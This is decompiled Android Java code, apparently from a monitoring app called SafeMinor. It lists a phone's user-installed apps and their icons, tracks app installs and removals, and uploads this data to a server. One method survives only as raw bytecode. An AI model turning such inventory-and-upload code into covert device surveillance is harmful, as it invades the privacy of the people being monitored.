package com.safe.minor.core.listener;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.drawable.BitmapDrawable;
import android.net.Uri;
import com.safe.minor.core.CallService;
import com.safe.minor.core.Registrar;
import com.safe.minor.core.SafeMinor;
import com.safe.minor.core.UploadManager;
import com.safe.minor.protocol.EventRequest;
import com.safe.minor.protocol.PackageChangeEvent;
import com.safe.minor.protocol.RegisterResponse;
import com.safe.minor.util.Base64;
import com.safe.minor.util.Config;
import com.safe.minor.util.Helper;
import com.safe.minor.util.LogWriter;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class PackageChangeListener
  extends BaseListener
{
  public PackageChangeListener() {}
  
  public static ArrayList<PackageChangeEvent> getInstalledApps()
  {
    Context localContext = SafeMinor.getContext();
    ArrayList localArrayList = new ArrayList();
    Object localObject1 = localContext.getPackageManager();
    int j = 0;
    localObject1 = ((PackageManager)localObject1).getInstalledPackages(0);
    int i = j;
    Object localObject2;
    if (LogWriter.isValidLevel(4))
    {
      localObject2 = new StringBuilder("All App : ");
      ((StringBuilder)localObject2).append(localObject1.toString());
      LogWriter.write(((StringBuilder)localObject2).toString());
      i = j;
    }
    while (i < ((List)localObject1).size())
    {
      localObject2 = (PackageInfo)((List)localObject1).get(i);
      if (((PackageInfo)localObject2).versionName != null)
      {
        Object localObject3;
        if ((!isSystemPackage((PackageInfo)localObject2)) && (!((PackageInfo)localObject2).packageName.equals("com.safe.minor")))
        {
          localObject3 = new PackageChangeEvent();
          ((PackageChangeEvent)localObject3).mName = ((PackageInfo)localObject2).applicationInfo.loadLabel(localContext.getPackageManager()).toString();
          ((PackageChangeEvent)localObject3).mNumber = ((PackageInfo)localObject2).packageName;
          ((PackageChangeEvent)localObject3).mPkg = ((PackageInfo)localObject2).packageName;
          if (LogWriter.isValidLevel(4))
          {
            localObject2 = new StringBuilder("Not System App : ");
            ((StringBuilder)localObject2).append(((PackageChangeEvent)localObject3).mName);
            ((StringBuilder)localObject2).append(" : ");
            ((StringBuilder)localObject2).append(((PackageChangeEvent)localObject3).mPkg);
            LogWriter.write(((StringBuilder)localObject2).toString());
          }
          localArrayList.add(localObject3);
        }
        else if (LogWriter.isValidLevel(4))
        {
          localObject3 = new StringBuilder("System App : ");
          ((StringBuilder)localObject3).append(((PackageInfo)localObject2).packageName);
          LogWriter.write(((StringBuilder)localObject3).toString());
        }
      }
      i += 1;
    }
    return localArrayList;
  }
  
  private static String getPackageBase64Image(String paramString, Context paramContext)
  {
    String str2 = "";
    String str1 = str2;
    for (;;)
    {
      try
      {
        paramContext = ((BitmapDrawable)paramContext.getPackageManager().getApplicationIcon(paramString)).getBitmap();
        str1 = str2;
        paramString = Helper.reSizeBitmap(paramContext, 45, 1);
        if (paramString == null)
        {
          str1 = str2;
          ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();
          str1 = str2;
          paramContext.compress(Bitmap.CompressFormat.PNG, 0, localByteArrayOutputStream);
          str1 = str2;
          byte[] arrayOfByte = localByteArrayOutputStream.toByteArray();
          paramString = str2;
          if (arrayOfByte != null)
          {
            paramString = str2;
            str1 = str2;
            if (arrayOfByte.length > 0)
            {
              str1 = str2;
              paramString = Base64.encodeBytes(arrayOfByte);
            }
          }
          str1 = paramString;
          paramContext.recycle();
          str1 = paramString;
          localByteArrayOutputStream.close();
          return paramString;
        }
      }
      catch (Exception paramString)
      {
        LogWriter.err(paramString);
        return str1;
      }
      paramContext = paramString;
    }
  }
  
  private static String getPackageName(Intent paramIntent)
  {
    paramIntent = paramIntent.getData();
    if (paramIntent != null) {
      return paramIntent.getSchemeSpecificPart();
    }
    return null;
  }
  
  private static boolean isSystemPackage(PackageInfo paramPackageInfo)
  {
    int i = paramPackageInfo.applicationInfo.flags;
    boolean bool1 = true;
    if ((i & 0x1) == 0) {
      bool1 = false;
    }
    boolean bool2 = bool1;
    if (bool1)
    {
      bool2 = bool1;
      if (SafeMinor.getContext().getPackageManager().getLaunchIntentForPackage(paramPackageInfo.packageName) != null) {
        bool2 = false;
      }
    }
    return bool2;
  }
  
  public static List<String> removeAllSystemApp(List<String> paramList, Context paramContext)
  {
    ArrayList localArrayList = new ArrayList();
    paramList = paramList.iterator();
    while (paramList.hasNext())
    {
      String str = (String)paramList.next();
      try
      {
        Object localObject = paramContext.getPackageManager().getApplicationInfo(str, 0);
        if ((localObject != null) && ((((ApplicationInfo)localObject).flags & 0x1) == 0))
        {
          localArrayList.add(str);
        }
        else if (LogWriter.isValidLevel(5))
        {
          localObject = new StringBuilder(">>>>>>IGNORE...:packages is system package");
          ((StringBuilder)localObject).append(str);
          LogWriter.warn(((StringBuilder)localObject).toString());
        }
      }
      catch (PackageManager.NameNotFoundException localNameNotFoundException)
      {
        LogWriter.err(localNameNotFoundException.getMessage());
      }
    }
    return localArrayList;
  }
  
  private void sendAllPackageInfo()
  {
    Context localContext = SafeMinor.getContext();
    EventRequest localEventRequest = new EventRequest();
    Iterator localIterator = getInstalledApps().iterator();
    for (;;)
    {
      int i = 0;
      int j;
      do
      {
        if (!localIterator.hasNext()) {
          break;
        }
        PackageChangeEvent localPackageChangeEvent = (PackageChangeEvent)localIterator.next();
        localPackageChangeEvent.mTime = System.currentTimeMillis();
        localPackageChangeEvent.mType = 2;
        localPackageChangeEvent.mImageBase64 = getPackageBase64Image(localPackageChangeEvent.mNumber, localContext);
        localEventRequest.addEvent(localPackageChangeEvent);
        j = i + 1;
        i = j;
      } while (j <= 5);
      if (CallService.mUploadManager != null) {
        CallService.mUploadManager.uploadEvent(localEventRequest);
      }
      localEventRequest.cleanList();
    }
    if (CallService.mUploadManager != null) {
      CallService.mUploadManager.uploadEvent(localEventRequest);
    }
  }
  
  public void Init()
  {
    if (Registrar.getLastResponse().isPackageChangeListenEnable)
    {
      if (!this.isRunning) {
        this.isRunning = true;
      }
      if (Config.getBoolValue(Config.PACKAGE_RUN_FIRSTTIME, true)) {
        new PackageChangeListener.1(this).start();
      }
    }
    else
    {
      Shutdown();
    }
  }
  
  public void Shutdown()
  {
    this.isRunning = false;
  }
  
  /* Error */
  public boolean onReceive(Context paramContext, Intent paramIntent)
  {
    // Byte code:
    //   0: aload_2
    //   1: invokevirtual 196	android/content/Intent:getData	()Landroid/net/Uri;
    //   4: astore 5
    //   6: iconst_3
    //   7: invokestatic 43	com/safe/minor/util/LogWriter:isValidLevel	(I)Z
    //   10: ifeq +33 -> 43
    //   13: new 45	java/lang/StringBuilder
    //   16: dup
    //   17: ldc_w 324
    //   20: invokespecial 50	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   23: astore 6
    //   25: aload 6
    //   27: aload_2
    //   28: invokevirtual 327	android/content/Intent:getAction	()Ljava/lang/String;
    //   31: invokevirtual 60	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   34: pop
    //   35: aload 6
    //   37: invokevirtual 61	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   40: invokestatic 330	com/safe/minor/util/LogWriter:debug	(Ljava/lang/String;)V
    //   43: iconst_3
    //   44: invokestatic 43	com/safe/minor/util/LogWriter:isValidLevel	(I)Z
    //   47: ifeq +34 -> 81
    //   50: new 45	java/lang/StringBuilder
    //   53: dup
    //   54: ldc_w 332
    //   57: invokespecial 50	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   60: astore 6
    //   62: aload 6
    //   64: aload 5
    //   66: invokevirtual 333	android/net/Uri:toString	()Ljava/lang/String;
    //   69: invokevirtual 60	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   72: pop
    //   73: aload 6
    //   75: invokevirtual 61	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   78: invokestatic 330	com/safe/minor/util/LogWriter:debug	(Ljava/lang/String;)V
    //   81: aload 5
    //   83: ifnull +292 -> 375
    //   86: invokestatic 292	com/safe/minor/core/Registrar:getLastResponse	()Lcom/safe/minor/protocol/RegisterResponse;
    //   89: getfield 298	com/safe/minor/protocol/RegisterResponse:isPackageChangeListenEnable	Z
    //   92: ifeq +189 -> 281
    //   95: new 244	com/safe/minor/protocol/EventRequest
    //   98: dup
    //   99: invokespecial 245	com/safe/minor/protocol/EventRequest:<init>	()V
    //   102: astore 5
    //   104: new 97	com/safe/minor/protocol/PackageChangeEvent
    //   107: dup
    //   108: invokespecial 98	com/safe/minor/protocol/PackageChangeEvent:<init>	()V
    //   111: astore 6
    //   113: aload 6
    //   115: invokestatic 254	java/lang/System:currentTimeMillis	()J
    //   118: putfield 258	com/safe/minor/protocol/PackageChangeEvent:mTime	J
    //   121: aload 6
    //   123: iconst_0
    //   124: putfield 261	com/safe/minor/protocol/PackageChangeEvent:mType	I
    //   127: aload 6
    //   129: aload_2
    //   130: invokestatic 335	com/safe/minor/core/listener/PackageChangeListener:getPackageName	(Landroid/content/Intent;)Ljava/lang/String;
    //   133: putfield 117	com/safe/minor/protocol/PackageChangeEvent:mNumber	Ljava/lang/String;
    //   136: new 45	java/lang/StringBuilder
    //   139: dup
    //   140: ldc_w 337
    //   143: invokespecial 50	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   146: astore 7
    //   148: aload 7
    //   150: aload 6
    //   152: getfield 117	com/safe/minor/protocol/PackageChangeEvent:mNumber	Ljava/lang/String;
    //   155: invokevirtual 60	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   158: pop
    //   159: aload 7
    //   161: invokevirtual 61	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   164: invokestatic 340	com/safe/minor/util/LogWriter:info	(Ljava/lang/String;)V
    //   167: aload 6
    //   169: aload_1
    //   170: invokevirtual 31	android/content/Context:getPackageManager	()Landroid/content/pm/PackageManager;
    //   173: aload 6
    //   175: getfield 117	com/safe/minor/protocol/PackageChangeEvent:mNumber	Ljava/lang/String;
    //   178: iconst_0
    //   179: invokevirtual 231	android/content/pm/PackageManager:getApplicationInfo	(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;
    //   182: aload_1
    //   183: invokevirtual 31	android/content/Context:getPackageManager	()Landroid/content/pm/PackageManager;
    //   186: invokevirtual 108	android/content/pm/ApplicationInfo:loadLabel	(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;
    //   189: invokeinterface 111 1 0
    //   194: putfield 114	com/safe/minor/protocol/PackageChangeEvent:mName	Ljava/lang/String;
    //   197: aload_2
    //   198: invokevirtual 327	android/content/Intent:getAction	()Ljava/lang/String;
    //   201: ldc_w 342
    //   204: invokevirtual 95	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   207: ifeq +26 -> 233
    //   210: aload 6
    //   212: aload 6
    //   214: getfield 117	com/safe/minor/protocol/PackageChangeEvent:mNumber	Ljava/lang/String;
    //   217: aload_1
    //   218: invokestatic 263	com/safe/minor/core/listener/PackageChangeListener:getPackageBase64Image	(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    //   221: putfield 266	com/safe/minor/protocol/PackageChangeEvent:mImageBase64	Ljava/lang/String;
    //   224: aload 6
    //   226: iconst_2
    //   227: putfield 261	com/safe/minor/protocol/PackageChangeEvent:mType	I
    //   230: goto +22 -> 252
    //   233: aload_2
    //   234: invokevirtual 327	android/content/Intent:getAction	()Ljava/lang/String;
    //   237: ldc_w 344
    //   240: invokevirtual 95	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   243: ifeq +9 -> 252
    //   246: aload 6
    //   248: iconst_1
    //   249: putfield 261	com/safe/minor/protocol/PackageChangeEvent:mType	I
    //   252: aload 5
    //   254: aload 6
    //   256: invokevirtual 270	com/safe/minor/protocol/EventRequest:addEvent	(Lcom/safe/minor/protocol/BaseEvent;)V
    //   259: getstatic 276	com/safe/minor/core/CallService:mUploadManager	Lcom/safe/minor/core/UploadManager;
    //   262: ifnull +19 -> 281
    //   265: getstatic 276	com/safe/minor/core/CallService:mUploadManager	Lcom/safe/minor/core/UploadManager;
    //   268: aload 5
    //   270: invokevirtual 282	com/safe/minor/core/UploadManager:uploadEvent	(Lcom/safe/minor/protocol/EventRequest;)V
    //   273: goto +8 -> 281
    //   276: astore_1
    //   277: aload_1
    //   278: invokestatic 188	com/safe/minor/util/LogWriter:err	(Ljava/lang/Exception;)V
    //   281: aload_2
    //   282: invokevirtual 327	android/content/Intent:getAction	()Ljava/lang/String;
    //   285: ldc_w 342
    //   288: invokevirtual 95	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   291: ifeq +38 -> 329
    //   294: invokestatic 254	java/lang/System:currentTimeMillis	()J
    //   297: lstore_3
    //   298: new 45	java/lang/StringBuilder
    //   301: dup
    //   302: ldc_w 346
    //   305: invokespecial 50	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   308: astore_1
    //   309: aload_1
    //   310: aload_2
    //   311: invokestatic 335	com/safe/minor/core/listener/PackageChangeListener:getPackageName	(Landroid/content/Intent;)Ljava/lang/String;
    //   314: invokevirtual 60	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   317: pop
    //   318: lload_3
    //   319: aload_1
    //   320: invokevirtual 61	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   323: iconst_1
    //   324: invokestatic 352	com/safe/minor/protocol/SystemEventLogEvent:uploadSystemEventLog	(JLjava/lang/String;I)V
    //   327: iconst_1
    //   328: ireturn
    //   329: aload_2
    //   330: invokevirtual 327	android/content/Intent:getAction	()Ljava/lang/String;
    //   333: ldc_w 344
    //   336: invokevirtual 95	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   339: ifeq +36 -> 375
    //   342: invokestatic 254	java/lang/System:currentTimeMillis	()J
    //   345: lstore_3
    //   346: new 45	java/lang/StringBuilder
    //   349: dup
    //   350: ldc_w 354
    //   353: invokespecial 50	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   356: astore_1
    //   357: aload_1
    //   358: aload_2
    //   359: invokestatic 335	com/safe/minor/core/listener/PackageChangeListener:getPackageName	(Landroid/content/Intent;)Ljava/lang/String;
    //   362: invokevirtual 60	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   365: pop
    //   366: lload_3
    //   367: aload_1
    //   368: invokevirtual 61	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   371: iconst_1
    //   372: invokestatic 352	com/safe/minor/protocol/SystemEventLogEvent:uploadSystemEventLog	(JLjava/lang/String;I)V
    //   375: iconst_1
    //   376: ireturn
    //   377: astore 7
    //   379: goto -182 -> 197
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	382	0	this	PackageChangeListener
    //   0	382	1	paramContext	Context
    //   0	382	2	paramIntent	Intent
    //   297	70	3	l	long
    //   4	265	5	localObject1	Object
    //   23	232	6	localObject2	Object
    //   146	14	7	localStringBuilder	StringBuilder
    //   377	1	7	localException	Exception
    // Exception table:
    //   from	to	target	type
    //   95	167	276	java/lang/Exception
    //   197	230	276	java/lang/Exception
    //   233	252	276	java/lang/Exception
    //   252	273	276	java/lang/Exception
    //   167	197	377	java/lang/Exception
  }
}
